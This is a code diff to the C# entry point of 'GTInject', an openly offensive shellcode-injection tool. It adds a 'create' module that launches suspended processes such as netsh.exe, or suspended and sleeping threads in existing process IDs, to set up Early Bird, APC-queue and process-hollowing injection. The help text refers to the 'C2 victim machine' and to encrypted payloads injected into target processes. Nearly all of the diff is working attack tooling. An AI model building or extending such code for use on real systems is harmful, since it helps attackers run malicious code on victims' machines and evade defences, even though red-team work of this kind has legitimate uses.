@@ -1,15 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Globalization;
 using GTInject.memoryOptions;
 using GTInject.Injection;
 using System.Diagnostics;
-using System.Diagnostics.SymbolStore;
-using GTInject.Novel;
-using System.Net.Sockets;
+using GTInject.Util;
 
 namespace GTInject
 {
@@ -26,6 +19,7 @@ namespace GTInject
             threads,
             inject,
             encrypt,
+            create,
             help
         }
   
@@ -50,6 +44,7 @@ Usage: GTInject.exe <module> <moduleArgs>
 
 Modules: 
     Encrypt
+    Create
     Threads
     Inject
 
@@ -61,8 +56,17 @@ Encrypt:
 
         Do this in preparation, not on the C2 victim machine.
 
+Create:
+        -- GTInject.exe create <process||thread||sleepThread> <ProcessPath||PID>
+        Used to create new processes or threads in Suspended states, or things like Early Bird injection or QueueUserAPC injection or Process Hollowing
+        
+        create process ""C:\Windows\System32\netsh.exe"" -- this would launch netsh.exe in a suspended state, use the inject module later
+        create thread 12345 -- this would create a new suspended thread in an existing Process ID
+        create sleepThread 12345 -- this would create a new thread in a DelayExecution wait state (by calling kernel32!SleepEx in the newly created thread)
+            sleepThread works with APC injection, but NOT with Thread Hijacking (get/setThreadContext) - APC was the goal, so I'm calling this 'working as designed'
+
 Threads:
-        -- GTInject.exe threads alertable 10234 --
+        --GTInject.exe threads alertable 10234 --
         Specify 'alertable' or 'all' threads
         Optionally specify a process ID
         Default will list all threads in an alertable state for all processes. Filters out low integrity processes to avoid isolated AppContainer threads.
@@ -160,6 +164,52 @@ ThreadExec Options
                 try { AlertableThreads.Alertable.GetThreads(threadsToReturn, optionalPidForThreads); } catch (Exception ex) { Console.WriteLine(ex.ToString()); }
             }
 
+            else if (command.ToLower() == "create"){
+                string createObject;
+                string createObjectInfo;
+                try
+                {
+                    createObject = args[1].ToString();
+                    createObjectInfo = args[2].ToString();
+                }
+                catch
+                {
+                    Console.WriteLine("Try again, read the help menu. Should be GTInject create something something like GTInject.exe create process C:\\windows\\system32\\netsh.exe");
+                    return;
+                }
+                // TODO : create mode flags. create process
+                // gtinject create process "C:\Windows\System32\netsh.exe"
+                var processInfo = createObjectInfo; // This will either be a string, or an int, so lets bring it back as str now and flip to int when needed
+                if (createObject == "process")
+                {
+                    Console.WriteLine("Creating suspended process " + processInfo);
+                    var createdProcInfo = CreateModule.CreateSuspendedProcess(processInfo);
+                    Console.WriteLine("Created: heres your PROCESS_INFORMATION : " + createdProcInfo);
+                }
+                else if (createObject == "thread")
+                {
+                    var createModProcessID = int.Parse(createObjectInfo);
+                    Console.WriteLine("Creating suspended thread in existing process " + createModProcessID);
+                    var createdThreadInfo = CreateModule.CreateSuspendedThread((uint)createModProcessID, IntPtr.Zero); // specifying an empty StartAddress for this thread if this will work
+                    Console.WriteLine("Thread created with empty start address with Handle in Decimal: " + createdThreadInfo);
+                }
+                else if(createObject.ToLower() == "sleepthread")
+                {
+                    //Doesn't currently work as desired. Successfully creates the thread in the delayexecution state, but injection doesn't the same, thread just sleeps, then exits, no injection takes place, despite success from injection calls
+                    Console.WriteLine("Will create a thread that sleeps for 2 minutes, but APC injection here doesn't currently work. TBD");
+                    Console.WriteLine("  Currently works with Thread Hijacking (getthreadcontext, setthreadcontext) but only triggers after the 2 minutes timer is finished");
+                    var createModProcessID = int.Parse(createObjectInfo);
+                    Console.WriteLine("Creating thread in DelayExecution state for Process ID " + createModProcessID);
+                    var createdThreadInfo = CreateModule.CreateDelayedExecutionThread((uint)createModProcessID);
+                    Console.WriteLine("Thread created with empty start address with Handle in Decimal: " + createdThreadInfo);
+
+                }
+                else
+                {
+                    Console.WriteLine("No valid create module arguments were given");
+                }
+            }
+
             else if (command.ToLower() == "inject")
             {
                 //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
@@ -214,7 +264,7 @@ ThreadExec Options
                             var resp = ThreadExec.SelectThreadOption(memoryResponse, execOption, pidResp, Tid);
                             return;
                         }
-                        
+
                     }
 
                     // In the right circumstance, you could technically inject twice doing this, once in a valid memoption, and again here. 
